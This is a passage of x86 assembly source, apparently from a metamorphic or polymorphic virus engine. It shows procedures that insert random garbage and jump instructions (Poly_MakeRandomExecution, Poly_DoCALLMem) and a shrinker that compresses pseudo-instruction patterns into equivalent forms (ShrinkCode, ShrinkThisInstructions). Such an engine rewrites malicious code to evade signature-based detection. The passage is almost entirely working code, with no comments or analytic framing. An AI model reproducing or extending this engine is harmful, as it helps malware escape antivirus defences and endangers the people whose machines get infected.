                mov     [ebp+Poly_JumpRandomExecution], edi 
                add     edi, 10h             
                ret                          

       @@DirectTEST:
                mov     eax, 48h      
                mov     [edi], eax
                xor     eax, eax
                call    Xpand_ReverseTranslation
                mov     [edi+1], eax
                call  @@GetARandomPowerOf2 
                mov     [edi+7], edx       
                add     edi, 10h
                jmp   @@SetTheJump

      @@Normal: xor     eax, eax      
                mov     [ebp+Poly_JumpRandomExecution], eax 
                ret                                         

   @@GetARandomPowerOf2:           
                call    Random     
                and     eax, 1Fh   
                mov     edx, 1
       @@LoopRotate:
                or      eax, eax
                jz    @@RotateFinish
                shl     edx, 1
                sub     eax, 1
                jmp   @@LoopRotate
       @@RotateFinish:
                ret
Poly_MakeRandomExecution endp



Poly_DoCALLMem  proc
                mov     eax, 1
                call    Random
                and     eax, 1
                jz    @@Single
                mov     eax, 40h     
                mov     [edi], eax
                call    Poly_GetAGarbageRegister
                mov     ebx, eax
                mov     [edi+1], eax
                mov     [edi+7], ecx
                add     edi, 10h
                mov     eax, 0EAh    
                mov     [edi], eax
                mov     eax, 0800h
                add     eax, ebx
                mov     [edi+1], eax
                xor     eax, eax
                mov     [edi+3], eax
                add     edi, 10h
                ret
    @@Single:   mov     eax, 0EAh   
                mov     [edi], eax
                mov     eax, 0808h
                mov     [edi+1], eax
                mov     [edi+3], ecx
                add     edi, 10h
                ret
Poly_DoCALLMem  endp


;---------------------------------------------------------------------------------------

ShrinkCode      proc
                mov     edi, [ebp+InstructionTable]
                mov     eax, [edi]
                and     eax, 0FFh   
                call    CheckIfInstructionUsesMem 
                or      eax, eax
                jz    @@Shrink      
                call    OrderRegs   
                                    
    @@Shrink:   mov     eax, [edi]
                and     eax, 0FFh   
                cmp     eax, 0FFh   
                jz    @@IncreaseEIP 
                call    ShrinkThisInstructions 
                                               
                or      eax, eax    
                jz    @@IncreaseEIP 
                call    DecreaseEIP 
                call    DecreaseEIP 
                call    DecreaseEIP 
                jmp   @@Shrink      

    @@IncreaseEIP:
                call    IncreaseEIP                         
                cmp     edi, [ebp+AddressOfLastInstruction] 
                jnz   @@Shrink                       

    @@DecreaseAddressOfLastInstruction:
                sub     edi, 10h        
                mov     eax, [edi]      
                and     eax, 0FFh
                cmp     eax, 0FFh
                jnz   @@LastInstructionOK
                mov     [ebp+AddressOfLastInstruction], edi
                jmp   @@DecreaseAddressOfLastInstruction
    @@LastInstructionOK:

    
                mov     edi, [ebp+InstructionTable]

    @@FindAPICALL_X:
    @@GetFirstInstruction:
                call    IncreaseEIP2 
                cmp     eax, -1      
                jz    @@EndOfScan    

                mov     eax, [edi]
                and     eax, 0FFh
                cmp     eax, 50h
                jnz   @@ItsNot_SET_WEIGHT
                push    edi
                mov     esi, edi

                call    IncreaseEIP2
                or      eax, eax
                jnz   @@ItsNot_SET_WEIGHT_2
                mov     eax, [edi]
                and     eax, 0FFh
                cmp     eax, 40h
                jnz   @@ItsNot_SET_WEIGHT_2
                mov     edx, edi

                call    IncreaseEIP2
                or      eax, eax
                jnz   @@ItsNot_SET_WEIGHT_2
                mov     eax, [edi]
                and     eax, 0FFh
                cmp     eax, 40h
                jnz   @@ItsNot_SET_WEIGHT_2
                mov     ecx, edi

                call    IncreaseEIP2
                or      eax, eax
                jnz   @@ItsNot_SET_WEIGHT_2
                mov     eax, [edi]
                and     eax, 0FFh
                cmp     eax, 43h
                jnz   @@ItsNot_SET_WEIGHT_2
                mov     ebx, edi

                call    IncreaseEIP2
                or      eax, eax
                jnz   @@ItsNot_SET_WEIGHT_2
                mov     eax, [edi]
                and     eax, 0FFh
                cmp     eax, 58h
                jnz   @@ItsNot_SET_WEIGHT_2

                mov     eax, [esi+1]
                and     eax, 0FFh
                mov     esi, eax
                mov     eax, [edx+1]
                and     eax, 0FFh
                cmp     eax, esi
                jnz   @@ItsNot_SET_WEIGHT_2
                mov     eax, [edi+1]
                and     eax, 0FFh
                cmp     eax, esi
                jnz   @@ItsNot_SET_WEIGHT_2
                mov     esi, [ecx+1]
                and     esi, 0FFh
                mov     eax, [ebx+7]
                and     eax, 0FFh
                cmp     eax, esi
                jnz   @@ItsNot_SET_WEIGHT_2
                pop     esi
                mov     eax, 0F7h          
                mov     [esi], al
                mov     eax, [esi+1]
                mov     [esi+9], al
                mov     eax, [ebx+1]
                mov     [esi+1], eax
                mov     eax, [ebx+3]
                mov     [esi+3], eax
                mov     eax, [edx+7]
                mov     [esi+7], al
                mov     eax, [ecx+1]
                mov     [esi+8], al
                mov     eax, 0FFh
                mov     [edx], eax
                mov     [ecx], eax
                mov     [ebx], eax
                mov     [edi], eax
                jmp   @@AllOK
        @@ItsNot_SET_WEIGHT_2:
                pop     edi
        @@ItsNot_SET_WEIGHT:
        @@AllOK:


    @@CheckAPICALL_X:

                mov     edx, edi     
                push    edi

    @@GetSecondInstruction:
                call    IncreaseEIP2 
                cmp     eax, -1      
                jz    @@EndOfScan    
                or      eax, eax     
                jnz   @@EndOfTriplet 
                mov     esi, edi     

    @@GetThirdInstruction:
                call    IncreaseEIP2 
                cmp     eax, -1      
                jz    @@EndOfScan    
                or      eax, eax
                jnz   @@EndOfTriplet

                mov     eax, [edx]   
                and     eax, 0FFh
                cmp     eax, 50h     
                jnz   @@FindAPICALL_END 
                mov     eax, [esi]   
                and     eax, 0FFh
                cmp     eax, 50h     
                jnz   @@FindAPICALL_END 
                mov     eax, [edi]   
                and     eax, 0FFh
                cmp     eax, 50h     
                jnz   @@FindAPICALL_END 
                mov     eax, [edx+1]
                and     eax, 0FFh
                or      eax, eax     
                jnz   @@FindAPICALL_END 
                mov     eax, [esi+1]
                and     eax, 0FFh
                cmp     eax, 1       
                jnz   @@FindAPICALL_END 
                mov     eax, [edi+1]
                and     eax, 0FFh
                cmp     eax, 2       
                jnz   @@FindAPICALL_END 
                mov     eax, 0F4h    
      @@SetAPICALL_X:
                mov     [edx], eax   
                mov     eax, 0FFh
                mov     [esi], eax   
                mov     [edi], eax
                jmp   @@EndOfTriplet 

      @@FindAPICALL_END:
                mov     eax, [edx]   
                and     eax, 0FFh
                cmp     eax, 58h     
                jnz   @@EndOfTriplet 
                mov     eax, [esi]   
                and     eax, 0FFh
                cmp     eax, 58h     
                jnz   @@EndOfTriplet 
                mov     eax, [edi]   
                and     eax, 0FFh
                cmp     eax, 58h     
                jnz   @@EndOfTriplet 
                mov     eax, [edx+1]
                and     eax, 0FFh
                cmp     eax, 2       
                jnz   @@EndOfTriplet 
                mov     eax, [esi+1]
                and     eax, 0FFh
                cmp     eax, 1       
                jnz   @@EndOfTriplet 
                mov     eax, [edi+1]
                and     eax, 0FFh
                or      eax, eax     
                jnz   @@EndOfTriplet 
                mov     eax, 0F5h    
                jmp   @@SetAPICALL_X

      @@EndOfTriplet:
                pop     edi          
                jmp   @@FindAPICALL_X

      @@EndOfScan:
                pop     edi
                ret
ShrinkCode      endp

DecreaseEIP     proc
     @@Again:   cmp     edi, [ebp+InstructionTable] 
                jz    @@OK                          
                mov     eax, [edi+0Bh]    
                and     eax, 0FFh   
                or      eax, eax    
                jnz   @@OK
                sub     edi, 10h    
                mov     eax, [edi]
                and     eax, 0FFh
                cmp     eax, 0FFh   
                jz    @@Again       
        @@OK:   ret
DecreaseEIP     endp



IncreaseEIP     proc
                mov     ecx, [ebp+AddressOfLastInstruction]
                cmp     edi, ecx      
                jz    @@_End          
       @@Again: add     edi, 10h      
                cmp     edi, ecx      
                jz    @@_End          
                mov     eax, [edi+0Bh] 
                and     eax, 0FFh
                or      eax, eax      
                jnz   @@End
                mov     eax, [edi]    
                and     eax, 0FFh
                cmp     eax, 0FFh     
                jz    @@Again
        @@End:  mov     eax, [edi]
                and     eax, 0FFh     
                call    CheckIfInstructionUsesMem     
                or      eax, eax
                jz    @@_End
                call    OrderRegs  
                                   
                mov     eax, [edi] 
                and     eax, 0FFh
                cmp     eax, 4Fh
                jnz   @@_End
                push    edi        
                mov     edi, [edi+7] 
                call    OrderRegs
                pop     edi
        @@_End: ret
IncreaseEIP     endp


IncreaseEIP2    proc
                cmp     edi, [ebp+AddressOfLastInstruction]
                jz    @@EndOfScan
                add     edi, 10h             
                cmp     edi, [ebp+AddressOfLastInstruction]
                jz    @@EndOfScan     
                mov     eax, [edi]    
                and     eax, 0FFh
                cmp     eax, 0FFh     
                jz      IncreaseEIP2
                mov     eax, [edi+0Bh] 
                and     eax, 0FFh      
                ret        
      @@EndOfScan:
                mov     eax, -1
                ret
IncreaseEIP2    endp



ShrinkThisInstructions proc
                push    edi
      @@Check_Single:
                mov     eax, [edi]
                and     eax, 0FFh
                cmp     eax, 30h      
                jnz   @@Single_Next00
                mov     ecx, 0E0h     
      @@Single_Next_CommonXOR_s1:
                mov     eax, [edi+7]  
        @@Single_Next_CommonXOR_s1_2:
                cmp     eax, -1       
                jz    @@Single_SetInstructionECX 
        @@Single_Next_CheckNulOP:
                or      eax, eax      
                jnz   @@Single_End
                jmp   @@Single_SetNOP 
        @@Single_SetInstructionECX:
                mov     eax, ecx      
                jmp   @@Single_SetInstruction

      @@Single_Next00:
                
                cmp     eax, 34h       
                jnz   @@Single_Next00_
                mov     ecx, 0E1h      
                jmp   @@Single_Next_CommonXOR_s1

      @@Single_Next00_:
                cmp     eax, 4Bh       
                jnz   @@Single_Next00__
                mov     eax, 4Ah       
                jmp   @@Single_SetInstruction 

      @@Single_Next00__:
                cmp     eax, 4Bh+80h  
                jnz   @@Single_Next01
                mov     eax, 4Ah+80h  
                jmp   @@Single_SetInstruction

      @@Single_Next01:
                cmp     eax, 30h+80h   
                jnz   @@Single_Next02
                mov     ecx, 0E2h      
        @@Single_Next01_GetSigned:
                mov     eax, [edi+7]
                and     eax, 0FFh
                cmp     eax, 80h
                jb    @@Single_Next01_NotSigned
                add     eax, 0FFFFFF00h
        @@Single_Next01_NotSigned:
                jmp   @@Single_Next_CommonXOR_s1_2

      @@Single_Next02:
                cmp     eax, 34h+80h   
                jnz   @@Single_Next03
                mov     ecx, 0E3h      
                jmp   @@Single_Next01_GetSigned

      @@Single_Next03:                
                cmp     eax, 41h        
                jnz   @@Single_Next04
        @@Single_Next_CommonMOV:
                mov     eax, [edi+1]    
                mov     ecx, [edi+7]    
                and     eax, 0FFh
                and     ecx, 0FFh
                cmp     eax, ecx        
                jnz   @@Single_End
      @@Single_SetNOP:
                mov     eax, 0FFh
      @@Single_SetInstruction:
                mov     ecx, [edi]      
                and     ecx, 0FFFFFF00h
                and     eax, 0FFh       
                add     eax, ecx
                mov     [edi], eax      
                jmp   @@EndCompressed

      @@Single_Next04:                
                cmp     eax, 41h+80h   
                jz    @@Single_Next_CommonMOV

      @@Single_Next05:                
                cmp     eax, 28h        
                jnz   @@Single_Next06
                xor     ecx, ecx        
      @@Single_Next_NegateImm:
                mov     eax, [edi+7]    
                neg     eax
                mov     [edi+7], eax
                jmp   @@Single_SetInstructionECX 

      @@Single_Next06:
                cmp     eax, 28h+80h   
                jnz   @@Single_Next07
                mov     ecx, 00h+80h   
                jmp   @@Single_Next_NegateImm 

      @@Single_Next07:                
                cmp     eax, 2Ch       
                jnz   @@Single_Next08
                mov     ecx, 04h       
                jmp   @@Single_Next_NegateImm

      @@Single_Next08:                
                cmp     eax, 2Ch+80h   
                jnz   @@Single_Next09
                mov     ecx, 04h+80h   
                jmp   @@Single_Next_NegateImm

      @@Single_Next09:                
                or      eax, eax       
                jnz   @@Single_Next10
        @@Single_Next_CheckNulOP_2:
                mov     eax, [edi+7]   
                jmp   @@Single_Next_CheckNulOP  

      @@Single_Next10:
                cmp     eax, 4                      
                jz    @@Single_Next_CheckNulOP_2 
                cmp     eax, 04h+80h                
                jz    @@Single_Next_CheckNulOP_2_8b 
                cmp     eax, 0Ch                    
                jz    @@Single_Next_CheckNulOP_2    
                cmp     eax, 0Ch+80h                
                jz    @@Single_Next_CheckNulOP_2_8b 
                cmp     eax, 24h+80h               
                jz    @@Single_Next10_Check_s1_8b  
                cmp     eax, 24h                   
                jnz   @@Single_Next10_             
        @@Single_Next10_Check_s1:
                mov     eax, [edi+7]   
                cmp     eax, -1
                jz    @@Single_SetNOP  
                or      eax, eax
                jnz   @@Single_End     
                mov     eax, 44h       
                jmp   @@Single_SetInstruction
        @@Single_Next10_Check_s1_8b:
                mov     eax, [edi+7]
                and     eax, 0FFh
                cmp     eax, 0FFh     
                jz    @@Single_SetNOP 
                or      eax, eax      
                jnz   @@Single_End    
                mov     eax, 44h+80h  
                jmp   @@Single_SetInstruction


      @@Single_Next10_:                
                cmp     eax, 00h+80h   
                jnz   @@Single_Next11
        @@Single_Next_CheckNulOP_2_8b:                
                mov     eax, [edi+7]   
                and     eax, 0FFh
                jmp   @@Single_Next_CheckNulOP

      @@Single_Next11:
                cmp     eax, 08h       
                jz    @@Single_Next_CheckNulOP_2  

      @@Single_Next12:                
                cmp     eax, 08h+80h   
                jz    @@Single_Next_CheckNulOP_2_8b  

      @@Single_Next13:                
                cmp     eax, 20h       
                jnz   @@Single_Next14
                mov     eax, [edi+7]   
                cmp     eax, -1
                jz    @@Single_SetNOP  
                or      eax, eax
                jnz   @@Single_End
                mov     eax, 40h       
                jmp   @@Single_SetInstruction

      @@Single_Next14:                
                cmp     eax, 20h+80h   
                jnz   @@Single_Next15
                mov     eax, [edi+7]   
                and     eax, 0FFh
                cmp     eax, 0FFh      
                jz    @@Single_SetNOP  
                or      eax, eax
                jnz   @@Single_End     
                mov     eax, 40h+80h   
                jmp   @@Single_SetInstruction

      @@Single_Next15:                
                cmp     eax, 31h       
                jnz   @@Single_Next16
      @@Single_Next_CheckSetTo0:
                mov     ecx, 40h       
      @@Single_Next_CheckSetTo0_2:
                mov     eax, [edi+1]   
                mov     ebx, [edi+7]
                and     eax, 0FFh
                and     ebx, 0FFh
                cmp     eax, ebx       
                jnz   @@Single_End     
                xor     eax, eax       
                mov     [edi+7], eax
                jmp   @@Single_SetInstructionECX

      @@Single_Next16:                
                cmp     eax, 31h+80h   
                jnz   @@Single_Next17
      @@Single_Next_CheckSetTo0_8b:
                mov     ecx, 40h+80h   
                jmp   @@Single_Next_CheckSetTo0_2 
                                                  
      @@Single_Next17:                
                cmp     eax, 29h       
                jz    @@Single_Next_CheckSetTo0 
                                                
      @@Single_Next18:                
                cmp     eax, 29h+80h   
                jz    @@Single_Next_CheckSetTo0_8b  
                                                    
      @@Single_Next19:                
                cmp     eax, 09h       
                jnz   @@Single_Next20
      @@Single_Next_CheckCheckIf0:
                mov     ecx, 38h       
                jmp   @@Single_Next_CheckSetTo0_2

      @@Single_Next20:                
                cmp     eax, 09h+80h   
                jnz   @@Single_Next21
      @@Single_Next_CheckCheckIf0_8b:
                mov     ecx, 38h+80h   
                jmp   @@Single_Next_CheckSetTo0_2

      @@Single_Next21:                
                cmp     eax, 21h       
                jz    @@Single_Next_CheckCheckIf0

      @@Single_Next22:                
                cmp     eax, 21h+80h   
                jz    @@Single_Next_CheckCheckIf0_8b

      @@Single_Next23:                
                cmp     eax, 49h       
                jz    @@Single_Next_CheckCheckIf0

      @@Single_Next24:                
                cmp     eax, 49h+80h   
                jz    @@Single_Next_CheckCheckIf0_8b

      @@Single_Next25:                
                cmp     eax, 0FCh      
                jnz   @@Single_Next26
                mov     eax, [edi+2]   
                and     eax, 0FFh
                cmp     eax, 40h       
                jae   @@Single_Next26  
                mov     eax, [edi+1]   
                and     eax, 0FFh      
                cmp     eax, 8         
                jz    @@Single_Next_LEA_CheckMOV 
                mov     ecx, [edi+7]
                and     ecx, 0FFh      
                cmp     eax, ecx       
                jz    @@Single_Next_LEA_CheckADD 
                mov     eax, [edi+2]   
                and     eax, 0FFh      
                cmp     eax, 8
                jz    @@Single_Next_LEA_CheckMOVRegReg 
                cmp     eax, ecx                  
                jz    @@Single_Next_LEA_CheckADDRegReg2 
                mov     ecx, [edi+1]   
                and     ecx, 0FFh
                cmp     eax, ecx       
                jnz   @@Single_End     
                mov     eax, 8         
                mov     ecx, [edi+1]
                and     ecx, 0FFFFFF00h
                add     eax, ecx
                mov     [edi+1], eax
                mov     eax, [edi+2]
                add     eax, 40h       
                mov     [edi+2], eax
                jmp   @@EndCompressed  
        @@Single_Next_LEA_CheckADDRegReg2:
                mov     eax, [edi+3]   
                or      eax, eax       
                jz    @@Single_Next_LEA_SetADDRegReg_2 
                jmp   @@Single_End
        @@Single_Next_LEA_CheckMOV:
                mov     eax, [edi+2]   
                and     eax, 0FFh      
                cmp     eax, 8
                jz    @@Single_Next_LEA_SetMOV 
                mov     ecx, [edi+7]   
                and     ecx, 0FFh
                cmp     eax, ecx       
                jz    @@Single_Next_LEA_SetADD_2
                mov     eax, [edi+3]   
                or      eax, eax       
                jnz   @@Single_End
        @@Single_Next_LEA_SetMOVRegReg_2:
                mov     eax, [edi+2]   
                mov     ecx, [edi+1]
                and     ecx, 0FFFFFF00h
                and     eax, 0FFh
                add     eax, ecx
                mov     [edi+1], eax
                mov     eax, 41h
                jmp   @@Single_SetInstruction
        @@Single_Next_LEA_SetADD_2:
                mov     ecx, [edi+1]     
                and     ecx, 0FFFFFF00h  
                and     eax, 0FFh
                add     eax, ecx
                mov     [edi+1], eax
                mov     eax, [edi+3]
                mov     [edi+7], eax
                xor     eax, eax
                jmp   @@Single_SetInstruction
        @@Single_Next_LEA_SetMOV:
                mov     ecx, 40h      
                mov     eax, [edi+7]
                and     eax, 0FFh
                mov     ebx, [edi+1]
                and     ebx, 0FFFFFF00h
                add     eax, ebx
                mov     [edi+1], eax
        @@Single_Next_LEA_SetInstructionECX:
                mov     eax, [edi+3]
                mov     [edi+7], eax
                jmp   @@Single_SetInstructionECX
        @@Single_Next_LEA_CheckADD:
                mov     eax, [edi+2]  
                and     eax, 0FFh
                cmp     eax, 8        
                jz    @@Single_Next_LEA_SetADD     
                mov     eax, [edi+3]      
                or      eax, eax          
                jnz   @@Single_End
        @@Single_Next_LEA_SetADDRegReg:
                mov     eax, [edi+2]      
                mov     ebx, [edi+1]
                and     ebx, 0FFFFFF00h
                and     eax, 0FFh
                add     eax, ebx
                mov     [edi+1], eax
        @@Single_Next_LEA_SetADDRegReg_2:
                mov     eax, 01h          
                jmp   @@Single_SetInstruction
        @@Single_Next_LEA_SetADD:
                mov     eax, [edi+3]
                mov     [edi+7], eax  
                xor     eax, eax      
                jmp   @@Single_SetInstruction
        @@Single_Next_LEA_CheckMOVRegReg:
                mov     eax, [edi+3]  
                or      eax, eax      
                jnz   @@Single_End
        @@Single_Next_LEA_SetMOVRegReg:
                mov     eax, 41h      
                jmp   @@Single_SetInstruction

      @@Single_Next26:
                cmp     eax, 4Fh      
                jnz   @@Single_Next27
                mov     esi, [edi+7]  
                mov     eax, [edi+1]  
                cmp     eax, [esi+1]  
                jnz   @@Single_End    
                mov     eax, [edi+3]
                cmp     eax, [esi+3]
                jz    @@Single_SetNOP

      @@Single_Next27:
                cmp     eax, 38h      
                jb    @@Single_Next28
                cmp     eax, 3Ch
                ja    @@Single_Next28
      @@Single_Next27_Common:
                mov     edx, edi     
      @@Single_Next27_GetNextInstr:  
                add     edx, 10h     
                mov     eax, [edx+0Bh] 
                and     eax, 0FFh
                or      eax, eax
                jnz   @@Single_SetNOP
                mov     eax, [edx]
                and     eax, 0FFh
                cmp     eax, 0FFh
                jz    @@Single_Next27_GetNextInstr
                cmp     eax, 70h
                jb    @@Single_SetNOP
                cmp     eax, 7Fh
                ja    @@Single_SetNOP
                jmp   @@Single_End


      @@Single_Next28:
                cmp     eax, 38h+80h   
                jb    @@Single_Next29
                cmp     eax, 3Ch+80h
                jbe   @@Single_Next27_Common

      @@Single_Next29:
                cmp     eax, 48h       
                jb    @@Single_Next30  
                cmp     eax, 4Ch       
                jbe   @@Single_Next27_Common

      @@Single_Next30:
                cmp     eax, 48h+80h   
                jb    @@Single_Next31
                cmp     eax, 4Ch+80h
                jbe   @@Single_Next27_Common

      @@Single_Next31:

      @@Single_End:

                mov     eax, [edi]   
                and     eax, 0FFh
                cmp     eax, 80h+00  
                jb    @@Check_Double
                cmp     eax, 80h+4Ch
                ja    @@Check_Double
                and     eax, 7
                or      eax, eax     
                jz    @@GetFrom_RegImm
                cmp     eax, 1       
                jz    @@GetFrom_RegReg
                cmp     eax, 2       
                jz    @@GetFrom_RegMem
                cmp     eax, 3       
                jnz   @@Check_Double 
      @@GetFrom_MemReg:              
      @@GetFrom_RegMem:              
      @@GetFrom_RegReg:              
                mov     eax, [edi+7] 
                and     eax, 0FFh    
                jmp   @@GetFrom_OK   
      @@GetFrom_RegImm:
                mov     eax, [edi+1]
                and     eax, 0FFh
      @@GetFrom_OK:
                mov     [ebp+Register8Bits], eax 

      @@Check_Double:
                mov     esi, edi
                call    IncreaseEIP   
                cmp     edi, [ebp+AddressOfLastInstruction] 
                jz    @@EndNoCompressed
                mov     eax, [edi+0Bh]
                and     eax, 0FFh
                or      eax, eax
                jnz   @@EndNoCompressed 
                                        
             
                mov     eax, [esi]
                and     eax, 0FFh
                cmp     eax, 68h     
                jnz   @@Double_Next00
                mov     eax, [edi]
                and     eax, 0FFh
                cmp     eax, 58h     
                jz    @@Double_Next_PutMOVRegImm
                cmp     eax, 59h     
                jnz   @@EndNoCompressed
        @@Double_Next_PutMOVMemImm:
                mov     eax, [edi+1]
                mov     [esi+1], eax
                mov     eax, [edi+3]
                mov     [esi+3], eax
                mov     eax, 44h     
                jmp   @@Double_Next_SetInstruction
        @@Double_Next_PutMOVRegImm:
                mov     eax, [edi+1]
                mov     [esi+1], eax
                mov     eax, 40h     
      @@Double_Next_SetInstruction:
                mov     ebx, [esi]
                and     ebx, 0FFFFFF00h
                and     eax, 0FFh
                add     eax, ebx
                mov     [esi], eax
      @@Double_Next_SetNOP:
                mov     eax, 0FFh    
                mov     [edi], al
                jmp   @@EndCompressed

      @@Double_Next00:                
                cmp     eax, 50h     
                jnz   @@Double_Next01
                mov     eax, [edi]
                and     eax, 0FFh
                cmp     eax, 58h     
                jz    @@Double_Next_PushPop
                cmp     eax, 0FEh    
                jz    @@Double_Next00_JMPReg
                cmp     eax, 59h     
                jnz   @@Double_End
                mov     eax, [esi+1]
                mov     ebx, [esi+7]
                and     ebx, 0FFFFFF00h
                and     eax, 0FFh
                add     eax, ebx
                mov     [esi+7], eax
                mov     eax, [edi+1]
                mov     [esi+1], eax
                mov     eax, [edi+3]
                mov     [esi+3], eax
                mov     eax, 43h     
                jmp   @@Double_Next_SetInstruction
        @@Double_Next_PushPop:
                mov     eax, [edi+1]
                mov     [esi+7], eax
                mov     eax, 41h     
                jmp   @@Double_Next_SetInstruction
        @@Double_Next00_JMPReg:
                mov     eax, 0EDh    
                jmp   @@Double_Next_SetInstruction

      @@Double_Next01:                
                cmp     eax, 51h     
                jnz   @@Double_Next02
                mov     eax, [edi]
                and     eax, 0FFh
                cmp     eax, 58h     
                jz    @@Double_Next01_PushPop
                cmp     eax, 59h     
                jnz   @@Double_End
        @@Double_Next01_MOVMemMem:
                mov     [esi+7], edi
                mov     [edi+7], esi
                mov     eax, 4Fh     
                jmp   @@Double_Next_SetInstruction
        @@Double_Next01_PushPop:
                mov     eax, [edi+1]
                mov     ebx, [edi+1]
                and     ebx, 0FFFFFF00h
                and     eax, 0FFh
                add     eax, ebx
                mov     [esi+7], eax
                mov     eax, 42h     
                jmp   @@Double_Next_SetInstruction

      @@Double_Next02:
                mov     eax, [esi+1]
                cmp     eax, [edi+1]
                jnz   @@Double_Next_NoMem
                mov     eax, [esi+3]    
                cmp     eax, [edi+3]    
                jnz   @@Double_Next_NoMem 
                                        
                mov     eax, [esi]
                and     eax, 0FFh
                cmp     eax, 0F6h       
                jz    @@Double_Next02_Check   
                                              
                cmp     eax, 43h        
                jnz   @@Double_Next03
      @@Double_Next02_Check:
                mov     eax, [edi]     
                and     eax, 0FFh
                cmp     eax, 51h       
                jz    @@Double_Next02_PushReg
                cmp     eax, 4Ch       
                jbe   @@Double_Next_OPRegReg
                cmp     eax, 0EAh      
                jz    @@Double_Next02_CALLMem
                cmp     eax, 0EBh      
                jnz   @@Double_End
        @@Double_Next02_JMPMem:
                mov     eax, 0EDh      
        @@Double_Next02_XXXMem:
                push    eax
                mov     eax, [esi+7]
                mov     ebx, [esi+1]
                and     ebx, 0FFFFFF00h
                and     eax, 0FFh
                add     eax, ebx
                mov     [esi+1], eax
                pop     eax
                jmp   @@Double_Next_SetInstruction
        @@Double_Next02_CALLMem:
                mov     eax, 0ECh      
                jmp   @@Double_Next02_XXXMem
        @@Double_Next_OPRegReg:
                and     eax, 7Fh       
                cmp     eax, 3Bh       
                jz    @@Double_Next02_MergeCheck 
                cmp     eax, 4Bh       
                jz    @@Double_Next02_MergeCheck 
                cmp     eax, 4Ah       
                jz    @@Double_Next02_MergeCheck 
                and     eax, 7
                cmp     eax, 2         
                jnz   @@Double_End     
                mov     eax, [esi+7]   
                mov     [esi+1], eax   
                mov     eax, [edi+7]   
                mov     [esi+7], eax   
                                       
                                       
        @@Double_Next02_SetOP:
                mov     eax, [edi]     
                and     eax, 0F8h      
                add     eax, 1
                jmp   @@Double_Next_SetInstruction
        @@Double_Next02_MergeCheck:
                mov     eax, [edi+7]
                mov     [esi+1], eax   
                jmp   @@Double_Next02_SetOP
        @@Double_Next02_PushReg:
                mov     eax, [esi+7]
                mov     [esi+1], eax
                mov     eax, 50h       
                jmp   @@Double_Next_SetInstruction

      @@Double_Next03:                
                cmp     eax, 0C3h   
                jnz   @@Double_Next04
                mov     eax, [edi]
                and     eax, 0FFh
                cmp     eax, 00h+80h  
                jb    @@Double_End    
                cmp     eax, 4Ch+80h
                jbe   @@Double_Next_OPRegReg
                jmp   @@Double_End

      @@Double_Next04:
                cmp     eax, 44h    
                jnz   @@Double_Next05
                mov     eax, [edi]
                and     eax, 0FFh
                cmp     eax, 51h    
                jz    @@Double_Next04_PushImm 
                cmp     eax, 4Ch
                ja    @@Double_Next05
                and     eax, 7
                cmp     eax, 2         
                jnz   @@Double_Next05  
        @@Double_Next_Merge_MOV_OP:
                mov     eax, [edi+7]
                mov     ebx, [esi+1]
                and     ebx, 0FFFFFF00h
                and     eax, 0FFh
                add     eax, ebx
                mov     [esi+1], eax
                mov     eax, [edi]
                and     eax, 0F8h   
                jmp   @@Double_Next_SetInstruction
        @@Double_Next04_PushImm:
                mov     eax, 68h    
                jmp   @@Double_Next_SetInstruction

      @@Double_Next05:
                mov     eax, [esi]
                and     eax, 0FFh
                cmp     eax, 44h+80h  
                jnz   @@Double_Next06
                mov     eax, [edi]
                and     eax, 0FFh
                cmp     eax, 00h+80h
                jb    @@Double_Next06
                cmp     eax, 4Ch+80h
                ja    @@Double_Next06
                and     eax, 7
                cmp     eax, 2
                jnz   @@Double_Next06
                jmp   @@Double_Next_Merge_MOV_OP

      @@Double_Next06:
                mov     eax, [esi]
                and     eax, 0FFh
                cmp     eax, 59h     
                jnz   @@Double_Next_NoMem
                mov     eax, [edi]
                and     eax, 0FFh
                cmp     eax, 42h     
                jz    @@Double_Next06_POPReg
                cmp     eax, 4Fh     
                jz    @@Double_Next06_POPMem
                cmp     eax, 51h     
                jz    @@Double_Next_SetDoubleNOP
                cmp     eax, 0EBh    
                jnz   @@Double_Next_NoMem
                mov     eax, 0FEh    
                jmp   @@Double_Next_SetInstruction
        @@Double_Next06_POPReg:
                mov     eax, [edi+7]
                mov     [esi+1], eax
                mov     eax, 58h     
                jmp   @@Double_Next_SetInstruction
        @@Double_Next06_POPMem:
                mov     ebx, [edi+7]
                mov     eax, [ebx+1]
                mov     [esi+1], eax
                mov     eax, [ebx+3]
                mov     [esi+3], eax 
                jmp   @@Double_Next_SetNOP
        @@Double_Next_SetDoubleNOP:
                mov     eax, 0FFh    
                jmp   @@Double_Next_SetInstruction


      @@Double_Next_NoMem:

                mov     eax, [esi]
                and     eax, 0FFh
                cmp     eax, 40h       
                jnz   @@Double_Next07
                mov     eax, [edi]
                and     eax, 0FFh
                cmp     eax, 42h+80h   
                jz    @@Double_Next06_MaybeMOVZX
                cmp     eax, 1         
                jnz   @@Double_Next07
                mov     eax, [esi+1]   
                and     eax, 0FFh      
                mov     ebx, [edi+7]
                and     ebx, 0FFh
                cmp     eax, ebx
                jnz   @@Double_Next07
                mov     eax, [esi+7]
                mov     [esi+3], eax
                mov     eax, [esi+1]
                mov     [esi+7], eax
                mov     eax, [edi+1]
                and     eax, 0FFh
                mov     ebx, [esi+1]
                and     ebx, 0FFFFFF00h
                add     eax, ebx
                mov     [esi+1], eax
        @@Double_Next06_SetLEA:
                mov     eax, [esi+2]
                and     eax, 0FFFFFF00h
                add     eax, 8
                mov     [esi+2], eax
                mov     eax, 0FCh
                jmp   @@Double_Next_SetInstruction
      @@Double_Next06_MaybeMOVZX:
                mov     eax, [esi+7]
                or      eax, eax
                jnz   @@Double_Next07
                mov     eax, [esi+1]
                and     eax, 0FFh
                mov     ebx, [edi+7]
                and     ebx, 0FFh
                cmp     eax, ebx
                jnz   @@Double_Next07
                mov     ebx, [edi+1]
                and     ebx, 0FFh
                cmp     eax, ebx
                jz    @@Double_Next07
                mov     ebx, [edi+2]
                and     ebx, 0Fh
                cmp     eax, ebx
                jz    @@Double_Next07
                mov     [esi+7], eax
                mov     eax, [edi+1]
                mov     [esi+1], eax
                mov     eax, [edi+3]
                mov     [esi+3], eax
                mov     eax, 0F8h   
                jmp   @@Double_Next_SetInstruction

      @@Double_Next07:
                mov     eax, [esi]
                and     eax, 0FFh
                cmp     eax, 41h    
                jnz   @@Double_Next08
                mov     eax, [edi]
                and     eax, 0FFh
                or      eax, eax    
                jz    @@Double_Next07_LEA01
                cmp     eax, 1      
                jnz   @@Double_Next08
                mov     eax, [esi+7]
                and     eax, 0FFh
                mov     ebx, [edi+7]
                and     ebx, 0FFh
                cmp     eax, ebx
                jnz   @@Double_Next08
